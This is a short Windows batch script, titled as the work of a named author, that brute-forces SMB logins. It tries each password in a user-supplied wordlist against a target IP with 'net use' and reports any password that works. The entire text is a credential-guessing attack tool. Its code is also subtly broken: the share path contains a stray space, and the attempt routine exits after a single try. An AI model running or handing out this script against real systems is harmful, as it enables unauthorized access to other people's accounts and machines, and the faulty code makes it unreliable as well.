title SMB Bruteforicing by Biswajit Malakar
color a
echo
set /p ip="ENTER IP ADDRESS:"
set /p user="ENTER USERNAME: "
set /p wordlist="ENTER PASSWORD: "
set /a count=1 
for /f %%a in (%wordlist%) do (
	set pass=%%a
	call :attempt
)
echo Password not found :
pause 
exit

:success
 echo Password Found! : %pass%
 net use \\%ip% /d /y >nul 2>&1
 pause
 exit

:attempt
 net use \\ %ip% /user:%user% %pass% >nul 2>&1
 echo [ATTEMPT %count%] [%pass%]
 set /a count =%count%+1
 if %errorlevel% EQU 0 goto success
 pause
 exit